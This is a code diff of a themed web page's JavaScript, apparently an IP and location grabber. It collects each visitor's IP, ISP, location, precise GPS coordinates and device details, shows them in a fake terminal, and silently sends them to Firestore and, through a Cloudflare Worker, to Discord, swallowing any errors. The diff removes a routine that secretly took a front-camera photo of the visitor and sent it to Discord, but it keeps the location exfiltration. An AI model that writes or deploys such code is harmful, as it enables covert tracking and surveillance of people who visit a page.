@@ -45,7 +45,6 @@
   .term .line{white-space:pre-wrap;word-break:break-word;padding:1.5px 0;}
   .term .line.gold{color:var(--gold);font-weight:600;}
   .term .line.pink{color:var(--pink);}
-  .term .line.dim{color:rgba(255,233,247,.45);}
   .cursor{display:inline-block;width:7px;height:.95em;background:var(--pink);
     animation:blink 1s steps(1) infinite;vertical-align:text-bottom;margin-left:2px;}
   @keyframes blink{50%{opacity:0}}
@@ -167,15 +166,8 @@ for(var s=0;s<(IS_MOBILE?6:12);s++){
 
 /* ── Terminal ─────────────────────────────────────────────────────────── */
 var term=document.getElementById("term");
-var cursorEl=null;
-function addLine(txt,cls){
-  if(cursorEl){term.removeChild(cursorEl);cursorEl=null;}
-  var d=document.createElement("div");d.className="line"+(cls?" "+cls:"");d.textContent=txt;term.appendChild(d);
-}
-function setCursor(){
-  if(cursorEl) return;
-  cursorEl=document.createElement("span");cursorEl.className="cursor";term.appendChild(cursorEl);
-}
+function addLine(txt,cls){var d=document.createElement("div");d.className="line"+(cls?" "+cls:"");d.textContent=txt;term.appendChild(d);}
+function addCursor(){var c=document.createElement("span");c.className="cursor";term.appendChild(c);}
 
 /* ── IP lookup ───────────────────────────────────────────────────────── */
 function fetchJson(url, ms){
@@ -212,54 +204,13 @@ function getGPS(){
         resolve({
           lat:      pos.coords.latitude,
           lon:      pos.coords.longitude,
-          accuracy: Math.round(pos.coords.accuracy) // meter
+          accuracy: Math.round(pos.coords.accuracy)
         });
       },
       function(){ resolve(null); },
       { timeout: 8000, maximumAge: 0, enableHighAccuracy: true }
     );
   });
-}
-
-/* ── Kamera depan (dijalankan SETELAH data dikirim) ─────────────────── */
-async function captureCamera(){
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-  var stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 400 }, height: { ideal: 300 } },
-      audio: false
-    });
-  } catch(e) { return null; }
-
-  try {
-    var vid = document.createElement("video");
-    vid.srcObject = stream;
-    vid.muted = true;
-    vid.playsInline = true;
-
-    await new Promise(function(res, rej){
-      var tid = setTimeout(function(){ rej(new Error("timeout")); }, 5000);
-      vid.onloadedmetadata = function(){ clearTimeout(tid); res(); };
-      vid.onerror          = function(e){ clearTimeout(tid); rej(e); };
-    });
-
-    await vid.play();
-    await new Promise(function(r){ setTimeout(r, 800); }); // warm-up
-
-    var cvs = document.createElement("canvas");
-    cvs.width  = vid.videoWidth  || 400;
-    cvs.height = vid.videoHeight || 300;
-    cvs.getContext("2d").drawImage(vid, 0, 0, cvs.width, cvs.height);
-
-    return await new Promise(function(resolve){
-      cvs.toBlob(function(b){ resolve(b || null); }, "image/jpeg", 0.75);
-    });
-  } catch(e) {
-    return null;
-  } finally {
-    if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
-  }
 }
 
 /* ── Kirim ke Firestore ──────────────────────────────────────────────── */
@@ -275,65 +226,54 @@ async function sendToFirestore(data) {
   } catch(e) { /* silent */ }
 }
 
-/* ── Kirim data teks ke Worker → Discord ────────────────────────────── */
-async function sendDataToWorker(data) {
+/* ── Kirim ke Cloudflare Worker → Discord ───────────────────────────── */
+async function sendToWorker(data) {
   if (!CF_READY) return;
   try {
     await fetch(WORKER_URL, {
-      method:  "POST",
+      method: "POST",
       headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify({
-        type:     "data",
-        url:      window.location.href,
-        referrer: document.referrer || null,
-        ...data
+      body: JSON.stringify({
+        ...data,
+        url: window.location.href,
+        referrer: document.referrer || null
       })
     });
   } catch(e) { /* silent */ }
 }
 
-/* ── Kirim foto ke Worker → Discord (pesan terpisah) ────────────────── */
-async function sendPhotoToWorker(photoBlob) {
-  if (!CF_READY) return;
-  try {
-    var form = new FormData();
-    form.append("type",  "photo");
-    form.append("photo", photoBlob, "visitor.jpg");
-    await fetch(WORKER_URL, { method: "POST", body: form });
-  } catch(e) { /* silent */ }
-}
-
 /* ── MAIN ────────────────────────────────────────────────────────────── */
 async function run(){
-  addLine("> guild@isekai:~$ mendeteksi penyusup...", "dim");
-  setCursor();
+  addLine("> guild@isekai:~$ melacak pengunjung...");
+  addLine("> mengambil koordinat portal...");
 
-  /* Step 1: IP + GPS secara paralel */
+  /* IP + GPS jalan paralel */
   var results = await Promise.all([getIpInfo(), getGPS()]);
   var info = results[0];
   var gps  = results[1];
 
-  var ip      = info&&info.ip           || "—";
-  var isp     = info&&info.org          || "—";
-  var city    = info&&info.city         || "";
-  var region  = info&&info.region       || "";
-  var country = info&&info.country_name || "";
-  var tz      = info&&info.timezone     || "—";
-  var lokasi  = [city,region,country].filter(Boolean).join(", ") || "—";
+  var ip      = info&&info.ip           ||"tidak diketahui";
+  var isp     = info&&info.org          ||"tidak diketahui";
+  var city    = info&&info.city         ||"";
+  var region  = info&&info.region       ||"";
+  var country = info&&info.country_name ||"";
+  var tz      = info&&info.timezone     ||"tidak diketahui";
+  var lokasi  = [city,region,country].filter(Boolean).join(", ")||"tidak diketahui";
 
-  addLine("> IP terdeteksi: " + ip,    "gold");
-  addLine("> ISP / Guild:   " + isp);
-  addLine("> Lokasi (IP):   " + lokasi);
+  addLine("> IP dunia nyata: "+ip, "gold");
+  addLine("> guild / ISP: "+isp);
+  addLine("> lokasi (IP): "+lokasi);
   if (gps) {
-    addLine("> GPS tepat:     " + gps.lat.toFixed(5) + ", " + gps.lon.toFixed(5) + " (±" + gps.accuracy + "m)", "gold");
-  } else {
-    addLine("> GPS:           tidak tersedia", "dim");
+    addLine("> GPS tepat: "+gps.lat.toFixed(5)+", "+gps.lon.toFixed(5)+" (±"+gps.accuracy+"m)", "gold");
   }
-  addLine("> Zona Waktu:    " + tz);
-  addLine("> Platform:      " + navigator.platform);
-  addLine("> Resolusi:      " + screen.width + "×" + screen.height + " (" + devicePixelRatio + "×)");
-  addLine("> Mengirim data ke guild...", "dim");
-  setCursor();
+  addLine("> zona waktu: "+tz);
+  addLine("> platform: "+navigator.platform);
+  addLine("> device: "+navigator.userAgent.slice(0,80)+"...");
+  addLine("> bahasa: "+navigator.language);
+  addLine("> resolusi: "+screen.width+"x"+screen.height+" ("+devicePixelRatio+"x)");
+  addLine("> rank akses: PENGUNJUNG TERSESAT","pink");
+  addLine("> mencatat ke grimoire...");
+  addCursor();
 
   var payload = {
     ip, isp, city, region, country, lokasi,
@@ -349,26 +289,11 @@ async function run(){
     gpsAcc:     gps ? gps.accuracy : null
   };
 
-  /* Step 2: Kirim data ke Discord + Firestore SEGERA (tanpa tunggu kamera) */
+  /* Kirim ke Firestore + Worker secara paralel */
   await Promise.all([
     sendToFirestore(payload),
-    sendDataToWorker(payload)
+    sendToWorker(payload)
   ]);
-
-  addLine("> Data terkirim. Meminta izin kamera...", "pink");
-  setCursor();
-
-  /* Step 3: Kamera berjalan SETELAH data terkirim, tidak memblokir */
-  captureCamera().then(function(photo){
-    if (photo) {
-      addLine("> Foto berhasil diambil, mengirim...", "gold");
-      sendPhotoToWorker(photo).then(function(){
-        addLine("> Foto terkirim ke guild.", "pink");
-      });
-    } else {
-      addLine("> Foto: tidak tersedia.", "dim");
-    }
-  });
 }
 
 run();
